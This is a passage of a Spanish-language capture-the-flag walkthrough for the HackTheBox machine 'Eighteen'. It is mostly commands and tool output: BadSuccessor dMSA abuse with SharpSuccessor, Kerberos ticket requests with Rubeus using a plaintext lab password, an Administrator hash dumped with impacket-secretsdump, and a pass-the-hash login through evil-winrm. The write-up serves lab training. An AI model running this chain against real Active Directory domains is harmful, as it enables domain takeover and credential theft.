Nmap scan report for DC01.eighteen.htb (224.0.0.1)
Host is up (0.25s latency).

PORT    STATE SERVICE
88/tcp  open  kerberos-sec
135/tcp open  msrpc
139/tcp open  netbios-ssn
389/tcp open  ldap
445/tcp open  microsoft-ds
464/tcp open  kpasswd5

Nmap done: 1 IP address (1 host up) scanned in 1.49 seconds
```
Funcionó correctamente.

#### Creando Ticket TGS de KRBGT con SharpSuccessor y Rubeus para Dumpear Hash de Administrador {#TGS}

Primero, veamos si la máquina tiene un **OU** vulnerable al **ataque BadSuccessor** con el script **Get-BadSuccessorOUPermissions.ps1**:
```batch
*Evil-WinRM* PS C:\Brsk> .\Get-BadSuccessorOUPermissions.ps1

Identity    OUs
--------    ---
EIGHTEEN\IT {OU=Staff,DC=eighteen,DC=htb}
```
Muy bien, tenemos un **OU** vulnerable.

Como la **OU** es vulnerable a escritura, utilizamos **SharpSuccessor.exe** para crear un **dMSA malicioso (Bad Successor)**. Este nuevo **dMSA** queda configurado para poder suplantar al **Administrador**. 

Como tenemos control de la cuenta **adam.scott**, podemos abusar de este sucesor para solicitar tickets **Kerberos** como **Administrador**.

Vamos a crear el **dMSA malicioso** y le asignamos un nombre; puede ser el que tú quieras:
```batch
*Evil-WinRM* PS C:\Brsk> .\SharpSuccessor.exe add /impersonate:Administrator /path:"OU=Staff,DC=eighteen,DC=htb" /account:adam.scott /name:Brsk
   _____ _                      _____
  / ____| |                    / ____|

 | (___ | |__   __ _ _ __ _ __| (___  _   _  ___ ___ ___  ___ ___  ___  _ __
  \___ \| '_ \ / _` | '__| '_ \\___ \| | | |/ __/ __/ _ \/ __/ __|/ _ \| '__|
  ____) | | | | (_| | |  | |_) |___) | |_| | (_| (_|  __/\__ \__ \ (_) | |

 |_____/|_| |_|\__,_|_|  | .__/_____/ \__,_|\___\___\___||___/___/\___/|_|
                         | |
                         |_|
@_logangoins

[+] Adding dnshostname Brsk.eighteen.htb
[+] Adding samaccountname Brsk$
[+] Administrator's DN identified
[+] Attempting to write msDS-ManagedAccountPrecededByLink
[+] Wrote attribute successfully
[+] Attempting to write msDS-DelegatedMSAState attribute
[+] Attempting to set access rights on the dMSA object
[+] Attempting to write msDS-SupportedEncryptionTypes attribute
[+] Attempting to write userAccountControl attribute
[+] Created dMSA object 'CN=Brsk' in 'OU=Staff,DC=eighteen,DC=htb'
[+] Successfully weaponized dMSA object
```
Perfecto, se creó el **dMSA** con nombre **Brsk**.

Necesitamos obtener un **TGT** del **usuario adam.scott** que utilizaremos para tramitar un **TGS** de **Kerberos**:
```batch
*Evil-WinRM* PS C:\Brsk> .\Rubeus.exe asktgt /user:adam.scott /password:iloveyou1 /domain:eighteen.htb /enctype:aes256 /outfile:adam_tgt.kirbi

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___

  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3

[*] Action: Ask TGT

[*] Using salt: EIGHTEEN.HTBadam.scott
[*] Using aes256_cts_hmac_sha1 hash:
```
Excelente, se generó correctamente.

Por último, utilizaremos el **TGT** que tramitamos y el **dMSA malicioso** que tiene el nombre de **Brsk** para tramitar un **TGS** del **servicio krbtgt**:
```batch
*Evil-WinRM* PS C:\Brsk> .\Rubeus.exe asktgs /targetuser:Brsk$ /service:krbtgt/eighteen.htb /dmsa /opsec /nowrap /ptt /ticket:adam_tgt.kirbi /outfile:krbtgt_tgs.kirbi

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___

  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3

[*] Action: Ask TGS

[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building DMSA TGS-REQ request for 'Brsk$' from 'adam.scott'
...
...

*Evil-WinRM* PS C:\Brsk> download krbtgt_tgs.kirbi
```
Bien, se generó correctamente y lo descargamos.

Vamos a descargar este **TGS** y lo vamos a convertir en un **archivo ccache** para poder exportarlo como variable de entorno. Este **TGS** nos servirá para dumpear el Hash del **Administrador**:
```bash
impacket-ticketConverter krbtgt_tgs.kirbi krbtgt_tgs.ccache
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] converting kirbi to ccache...
[+] done
                                                                                                                                                                                              
export KRB5CCNAME=krbtgt_tgs.ccache
                                                                                                                                                                                              
klist
Ticket cache: FILE:krbtgt_tgs.ccache
Default principal: Brsk$@eighteen.htb

Valid starting     Expires            Service principal
30/11/25 23:26:47  30/11/25 23:41:47  krbtgt/EIGHTEEN.HTB@EIGHTEEN.HTB
	renew until 07/12/25 22:32:52

```
Listo, lo tenemos cargado ya en nuestra máquina.

Antes de intentar dumpear el Hash del **Administrador**, necesitamos estar en el mismo horario que la máquina víctima y eso lo haremos con el siguiente comando:
```bash
timedatectl set-time "$(date -d "$(curl -s -I http://10.10.11.95 | grep -i '^Date:' | cut -d' ' -f2-)" '+%Y-%m-%d %H:%M:%S')"
```

Utilizamos **proxychains** para ejecutar la herramienta **impacket-secretsdump** y deberíamos obtener el Hash del **Administrador**. Te recomiendo usar la flag `-debug` para que puedas ver si hay un error de tiempo o por si el **TGS** ya caducó y tengas que tramitarlo de nuevo:
```bash
proxychains impacket-secretsdump -k -no-pass DC01.eighteen.htb -just-dc-user Administrator -debug
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  DC01.eighteen.htb:445  ...  OK
[+] Using Kerberos Cache: krbtgt_tgs.ccache
[+] Domain retrieved from CCache: eighteen.htb
[+] SPN CIFS/DC01.EIGHTEEN.HTB@EIGHTEEN.HTB not found in cache
[+] AnySPN is True, looking for another suitable SPN
[+] Returning cached credential for KRBTGT/EIGHTEEN.HTB@EIGHTEEN.HTB
[+] Using TGT from cache
[+] Username retrieved from CCache: Brsk$
[+] Trying to connect to KDC at EIGHTEEN.HTB:88
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  EIGHTEEN.HTB:88  ...  OK
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  DC01.eighteen.htb:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  DC01.eighteen.htb:49680  ...  OK
[+] Trying to connect to KDC at EIGHTEEN.HTB:88
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  EIGHTEEN.HTB:88  ...  OK
[+] Calling DRSCrackNames for Administrator 
[+] Calling DRSGetNCChanges for {111a3da4-cbd8-49fd-a3fd-c973c51bbe2b} 
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=Administrator,CN=Users,DC=eighteen,DC=htb
Administrator:500:
...
```
Tenemos el Hash.

Úsalo con la herramienta **Evil-WinRM** para autenticarte como el **Administrador**:
```batch
evil-winrm -i 10.10.11.95 -u 'administrator' -H '**********'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
eighteen\administrator
```
Estamos dentro.

Obtengamos la última flag:
```batch
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
...
```
Y con esto, terminamos la máquina.
